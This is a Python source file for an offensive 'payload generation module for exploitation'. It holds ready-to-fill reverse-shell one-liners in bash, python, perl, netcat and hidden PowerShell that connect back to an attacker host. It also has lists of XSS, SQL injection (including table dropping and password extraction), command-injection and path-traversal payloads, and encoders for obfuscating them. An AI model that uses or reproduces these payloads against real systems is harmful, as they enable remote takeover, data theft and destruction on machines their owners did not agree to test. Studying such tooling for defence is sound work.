"""Payload generation module for exploitation"""
import base64, urllib.parse
from typing import Dict, List

class PayloadGenerator:
    """Generate various exploit payloads"""
    
    REVERSE_SHELLS = {
        "bash": "bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1",
        "python": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{HOST}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        # Perl braces doubled ({{ }}) so str.format only substitutes HOST/PORT
        "perl": "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in({PORT},inet_aton(\"{HOST}\")))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/sh\");}}'",
        "nc": "nc -e /bin/sh {HOST} {PORT}",
        "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{HOST}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(Invoke-Expression $d 2>&1|Out-String);$p=([text.encoding]::ASCII).GetBytes($o);$s.Write($p,0,$p.Length);$c.Close()}}\"",
    }

    def __init__(self):
        pass

    def generate_xss_payloads(self) -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video src=x onerror=alert(1)>",
        ]

    def generate_sql_injection_payloads(self) -> List[str]:
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users --",
            "' UNION SELECT NULL --",
            "' UNION SELECT username, password FROM users --",
            "1' AND '1'='1",
            "1' AND SLEEP(5) --",
        ]

    def generate_command_execution_payloads(self) -> List[str]:
        return ["; id", "| id", "& id", "`id`", "$(id)", "; cat /etc/passwd"]

    def generate_path_traversal_payloads(self) -> List[str]:
        return ["../", "../../", "../../../", "../../../../", "../etc/passwd", "....//....//etc/passwd"]

    def generate_reverse_shell(self, shell_type: str, host: str, port: int) -> str:
        if shell_type not in self.REVERSE_SHELLS:
            raise ValueError(
                f"Unknown shell type '{shell_type}'. "
                f"Available: {', '.join(sorted(self.REVERSE_SHELLS))}")
        if not host:
            raise ValueError("Host must not be empty")
        if not (1 <= int(port) <= 65535):
            raise ValueError(f"Port must be 1-65535, got {port}")
        return self.REVERSE_SHELLS[shell_type].format(HOST=host, PORT=port)

    def encode_base64(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    def encode_url(self, payload: str) -> str:
        return urllib.parse.quote(payload)

    def encode_hex(self, payload: str) -> str:
        return payload.encode().hex()

    def generate_all_encodings(self, payload: str) -> Dict[str, str]:
        return {
            "plain": payload,
            "base64": self.encode_base64(payload),
            "url": self.encode_url(payload),
            "hex": self.encode_hex(payload),
        }
